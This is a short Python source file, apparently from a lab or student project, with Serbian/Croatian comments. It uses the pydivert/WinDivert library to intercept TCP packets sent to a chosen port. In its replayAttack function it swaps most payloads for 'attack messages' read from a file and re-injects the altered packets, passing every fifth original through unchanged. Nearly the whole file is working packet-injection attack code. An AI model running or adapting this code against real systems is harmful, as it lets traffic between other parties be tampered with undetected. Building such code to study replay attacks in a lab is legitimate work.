import pydivert

import threadManagement
from sniff import *

"Kopiranje uhvacenog paketa"


def copy_packet(original_packet):
    new_packet = pydivert.Packet(raw=original_packet.raw,
                                 direction=original_packet.direction,
                                 interface=original_packet.interface)
    new_packet.src_addr = original_packet.src_addr
    new_packet.dst_addr = original_packet.dst_addr
    new_packet.src_port = original_packet.src_port
    new_packet.dst_port = original_packet.dst_port
    # new_packet.protocol = original_packet.protocol
    return new_packet


def replayAttack(sourcePort, file):
    counter = 0
    with pydivert.WinDivert(f"tcp.DstPort == {sourcePort} and tcp.PayloadLength == 11") as w:
        for packet in w:
            attackMessages = file[counter]  # vadim poruke za napad
            print(f"Attack message from file:{attackMessages}")
            print(f"Message from packet {packet.payload}")
            if counter%5 != 0:
                print("Poslao maliciuznu")
                paketCopy = copy_packet(packet)
                paketCopy.payload = attackMessages
                w.send(paketCopy)
            else:
                w.send(packet)  # svaki peti ce se slati originalni
            counter += 1
            if counter >= len(file):
                counter = 0
            with threadManagement.ThreadManagement.replayLock:
                if threadManagement.ThreadManagement.stopReplay == True:
                    return
